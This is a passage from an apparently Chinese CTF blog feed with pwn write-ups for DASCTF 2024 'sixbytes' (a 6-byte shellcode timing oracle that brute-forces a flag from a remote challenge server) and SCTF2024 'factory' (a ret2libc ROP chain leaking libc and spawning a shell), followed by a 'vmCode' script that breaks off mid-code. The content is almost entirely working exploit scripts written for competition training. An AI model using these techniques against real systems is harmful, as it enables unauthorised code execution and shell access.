    <link href="/2024/10/20/DASCTF%202024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%EF%BD%9C%E7%A7%8B%E6%84%8F%E6%B5%93%EF%BC%8C%E6%88%98%E7%81%AB%E7%87%83%EF%BC%8C%E7%A0%81%E4%B8%8A%E8%A7%81%E7%9C%9F%E7%AB%A0/"/>
    <url>/2024/10/20/DASCTF%202024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%EF%BD%9C%E7%A7%8B%E6%84%8F%E6%B5%93%EF%BC%8C%E6%88%98%E7%81%AB%E7%87%83%EF%BC%8C%E7%A0%81%E4%B8%8A%E8%A7%81%E7%9C%9F%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><input checked="" disabled="" type="checkbox"> sixbytes</li><li><input disabled="" type="checkbox"> usersys (复现)</li><li><input disabled="" type="checkbox"> ChromeLogger (复现)</li></ul><h2 id="sixbytes"><a href="#sixbytes" class="headerlink" title="sixbytes"></a>sixbytes</h2><p>6个字节的shellcode</p><p>最开始爆3不出来, 后面调试了下可以发现是因为idx为和不为0的时候跳转的循环地址不同, 直接跳过flag头开爆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>  <br><br>io_ch=<span class="hljs-number">0</span><br><br>de_bug=<span class="hljs-number">0</span><br><br>url=<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span><br><br>port=<span class="hljs-number">25036</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-keyword">if</span> io_ch==<span class="hljs-number">1</span>:<br><br>    io=remote(url,port)<br><br><span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment">#io=process([&quot;qemu-aarch64-static&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span><br><br>    io=process(filename)<br><br>    <span class="hljs-keyword">if</span> de_bug==<span class="hljs-number">1</span>:<br><br>        gdb.attach(io)<br><br><span class="hljs-keyword">if</span> filename!=<span class="hljs-string">&#x27;&#x27;</span>:<br><br>    elf=ELF(filename)<br><br>    <span class="hljs-comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br><br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br><br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br><br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br><br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br><br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br><br>rcg = <span class="hljs-keyword">lambda</span> : u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>r_l.srand(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">cmp byte ptr [rdi+&#123;&#125;],&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">ja $-0x4</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br>  <br><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>(<span class="hljs-params">i,j</span>):<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br><br>    sl(asm(shellcode.<span class="hljs-built_in">format</span>(i,j)))<br><br>    <span class="hljs-comment">#log.info(&#x27;#---#---#---#---#&#x27;)</span><br><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br><br>    <span class="hljs-comment">#log.success(&#x27;libc.address:&#x27;+hex(libc.address))</span><br><br>    <span class="hljs-comment">#log.success(&#x27;elf.address:&#x27;+hex(elf.address))</span><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br><br>    idx = <span class="hljs-number">5</span><br><br>    l = <span class="hljs-number">0x20</span><br><br>    r = <span class="hljs-number">0x80</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><br>        sleep(<span class="hljs-number">0.5</span>)<br><br>        mid = (l + r) // <span class="hljs-number">2</span><br><br>        <span class="hljs-built_in">print</span>(l,mid,r)<br><br>        io=remote(url,port)<br><br>        <span class="hljs-keyword">try</span>:<br><br>            pwn_exp(idx, mid)<br><br>            io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,timeout=<span class="hljs-number">1</span>)<br><br>            <span class="hljs-comment">#小于</span><br><br>            l = mid+<span class="hljs-number">1</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DDD&quot;</span>)<br><br>            io.close()<br><br>        <span class="hljs-keyword">except</span>:<br><br>            <span class="hljs-comment">#等于大于</span><br><br>            r = mid<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EEE&quot;</span>)<br><br>            io.close()<br><br>        <span class="hljs-keyword">if</span> l == r:<br><br>            flag += <span class="hljs-built_in">chr</span>(l)<br><br>            idx += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(l) == <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br><br>                <span class="hljs-built_in">print</span>(flag)<br><br>                exit()<br><br>            l = <span class="hljs-number">0x20</span><br><br>            r = <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTF2024</title>
    <link href="/2024/10/08/SCTF2024/"/>
    <url>/2024/10/08/SCTF2024/</url>
    
    <content type="html"><![CDATA[<h2 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>pop_rdi = <span class="hljs-number">0x0000000000401563</span><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret = <span class="hljs-number">0x000000000040101a</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ss</span>(<span class="hljs-params">c</span>):<br>    ru(<span class="hljs-string">&quot;factory&quot;</span>)<br>    sla(<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-built_in">str</span>(c))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn_exp</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PWN&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;How many factorys do you want to build: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">40</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>):<br>        ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">28</span>)<br>    ss(pop_rdi)<br>    ss(puts_got)<br>    ss(puts_plt)<br>    ss(<span class="hljs-number">0x401303</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ru(<span class="hljs-string">&#x27;\x0a&#x27;</span>)<br>    puts_Addr = u64_ex(io.recv(<span class="hljs-number">6</span>))<br>    libc.address = puts_Addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    CG.set_find_area(find_in_libc=<span class="hljs-literal">True</span>,find_in_elf=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>):<br>        ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">28</span>)<br>    ss(ret)<br>    ss(pop_rdi)<br>    ss(CG.bin_sh())<br>    ss(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>])<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br>    ss(<span class="hljs-number">0x33333333</span>)<br><br><span class="hljs-comment"># b * 0x4013FD</span><br><br><span class="hljs-comment">#log</span><br>    <span class="hljs-comment">#libc=LibcSearcher(&quot;gets&quot;,gets_Addr);</span><br>    log.info(<span class="hljs-string">&#x27;#---#---#---#---#&#x27;</span>)<br>    log.success(<span class="hljs-string">&#x27;libc.address:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br>    <span class="hljs-comment">#log.success(&#x27;heap_bae:&#x27;+hex(heap_base))</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn_exp()<br>    io.interactive()<br></code></pre></td></tr></table></figure><h2 id="vmCode"><a href="#vmCode" class="headerlink" title="vmCode"></a>vmCode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>cli_script() <span class="hljs-comment"># 使用脚本模式必须显式调用这个函数</span><br><br><span class="hljs-comment"># 你能够从gift里面取到很多东西</span><br>io   = gift[<span class="hljs-string">&#x27;io&#x27;</span>] <span class="hljs-comment"># process或remote对象</span><br>elf  = gift[<span class="hljs-string">&quot;elf&quot;</span>] <span class="hljs-comment"># ELF对象，ELF(&quot;./pwn&quot;)</span><br>libc = gift.libc <span class="hljs-comment"># ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br>filename  = gift.filename <span class="hljs-comment"># current filename</span><br>is_debug  = gift.debug <span class="hljs-comment"># is debug or not </span><br>is_remote = gift.remote <span class="hljs-comment"># is remote or not</span><br>gdb_pid   = gift.gdb_pid <span class="hljs-comment"># gdb pid if debug</span><br><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> gift.remote:<br>    <span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>    gift[<span class="hljs-string">&#x27;libc&#x27;</span>] = libc<br>    <span class="hljs-comment"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br>    <span class="hljs-keyword">pass</span><br>libc_box = LibcBox() <span class="hljs-comment"># LibcBox对象</span><br><br>r_l = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>r_l.srand(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment">#返回地址为控制rax为与0x123a的偏移</span><br><span class="hljs-comment">#code_=[code+rsi] #rsi_base = 0x41</span><br><span class="hljs-comment">#ret_addr=[0x2020+(code_-0x21)*2]+0x123a</span><br><span class="hljs-comment">#rdi 为 stack偏移 rdi_base = 1</span><br>opt = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1274</span>():<br>    <span class="hljs-keyword">global</span> opt<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1299</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x22&#x27;</span><br>    <span class="hljs-comment">#rdi--</span><br>    <span class="hljs-comment">#rsi=stack[rdi]</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_12a7</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x23&#x27;</span><br>    <span class="hljs-comment">#stack[rdi-2]^=stack[rdi-1]</span><br>    <span class="hljs-comment">#rdi--</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_12c4</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x24&#x27;</span><br>    <span class="hljs-comment">#tmp = stack[rdi-1]</span><br>    <span class="hljs-comment">#stack[rdi-1] = stack[rdi-3]</span><br>    <span class="hljs-comment">#stack[rdi-3] = tmp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_12e0</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x25&#x27;</span><br>    <span class="hljs-comment">#tmp=stack[rdi-1]</span><br>    <span class="hljs-comment">#stack[rdi-1]=stack[rdi-2]</span><br>    <span class="hljs-comment">#stack[rdi-2]=tmp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_12fc</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x26&#x27;</span><br>    <span class="hljs-comment">#stack[rdi]=code[rsi]</span><br>    <span class="hljs-comment">#rsi+=4</span><br>    <span class="hljs-comment">#rdi++</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1319</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x27&#x27;</span><br>    <span class="hljs-comment">#stack[rdi-1]&amp;=0xff</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_132e</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x28&#x27;</span><br>    <span class="hljs-comment">#rdi--</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1332</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x29&#x27;</span><br>    <span class="hljs-comment">#stack[rdi-1]&gt;&gt;8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1348</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x2a&#x27;</span><br>    <span class="hljs-comment">#stack[rdi]=stack[rdi-1]</span><br>    <span class="hljs-comment">#rdi++</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_135c</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x2b&#x27;</span><br>    <span class="hljs-comment">#stack[rdi-1]&lt;&lt;8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1372</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x2c&#x27;</span><br>    <span class="hljs-comment"># rdi==0 --&gt; rsi+=2; ret</span><br>    <span class="hljs-comment"># rdi!=0 --&gt; ax=code[rsi] ; rsi+=2; rsi = (rsi+ax)&amp;0xff  ; ret</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_13a3</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x2d&#x27;</span><br>    <span class="hljs-comment"># stack[rdi-2] &gt;&gt; (stack[rdi-1]&amp;0xff)</span><br>    <span class="hljs-comment"># rdi--</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_13c0</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x2e&#x27;</span><br>    <span class="hljs-comment"># stack[rdi-2] &lt;&lt; (stack[rdi-1]&amp;0xff)</span><br>    <span class="hljs-comment"># rdi--</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_13dd</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x2f&#x27;</span><br>    <span class="hljs-comment"># stack[rdi-2] &amp;= stack[rdi-1]</span><br>    <span class="hljs-comment"># rdi--</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_13fa</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x30&#x27;</span><br>    <span class="hljs-comment"># rax = stack[rdi-1]</span><br>    <span class="hljs-comment"># rdi_ = stack[rdi-2]</span><br>    <span class="hljs-comment"># rsi_ = stack[rdi-3]</span><br>    <span class="hljs-comment"># rdx = stack[rdi-4]</span><br>    <span class="hljs-comment"># syscall</span><br>    <span class="hljs-comment"># rdi -= 3</span><br>    <span class="hljs-comment"># stack[rdi-1] = rax</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1425</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>    <span class="hljs-comment"># stack[rdi] = stack[rdi-1]</span><br>    <span class="hljs-comment"># rdi++</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_1439</span>():<br>    <span class="hljs-keyword">global</span> opt<br>    opt += <span 